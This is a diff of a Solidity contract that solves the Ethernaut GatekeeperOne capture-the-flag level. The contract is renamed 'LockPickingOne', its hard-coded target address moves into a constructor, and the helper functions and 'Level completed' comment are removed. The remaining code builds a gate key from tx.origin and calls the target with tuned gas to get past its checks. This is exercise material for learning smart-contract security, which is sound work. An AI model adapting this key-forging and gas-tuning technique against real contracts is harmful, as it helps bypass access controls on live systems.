@@ -6,8 +6,12 @@ pragma solidity ^0.8.20;
  * @dev Make it past the gatekeeper and register as an entrant to pass this level.
  */
 
-contract Ethernaut_GateKeeperOne {
-    address private gateKeeper = 0x3D47f75FdB928E3DC0206DC0Dc3470fF79A43fE2; // Replace with your GatekeeperOne instance
+contract LockPickingOne {
+    address private gateKeeper;
+
+    constructor(address _gateKeeper) {
+        gateKeeper = _gateKeeper;
+    }
 
     function constructGateKey() public view returns (bytes8 gateKey) {
         // Extract the least significant 16 bits from tx.origin
@@ -21,7 +25,6 @@ contract Ethernaut_GateKeeperOne {
         return gateKey;
     }
 
-    // Pass Gate 1: require(msg.sender != tx.origin);
     function attack(uint256 gas) external {
         bytes8 key = constructGateKey();
 
@@ -33,24 +36,4 @@ contract Ethernaut_GateKeeperOne {
         );
         require(success, "Attack failed");
     }
-
-    function tryFirstCheck(
-        bytes8 _gateKey
-    ) public pure returns (uint32, uint16) {
-        return (uint32(uint64(_gateKey)), uint16(uint64(_gateKey))); // ==
-    }
-
-    function trySecondCheck(
-        bytes8 _gateKey
-    ) public pure returns (uint32, uint64) {
-        return (uint32(uint64(_gateKey)), uint64(_gateKey)); // !=
-    }
-
-    function tryThirdCheck(
-        bytes8 _gateKey
-    ) public view returns (uint32, uint16) {
-        return (uint32(uint64(_gateKey)), uint16(uint160(msg.sender))); // ==
-    }
 }
-
-// 🎉 Level completed! 🎉
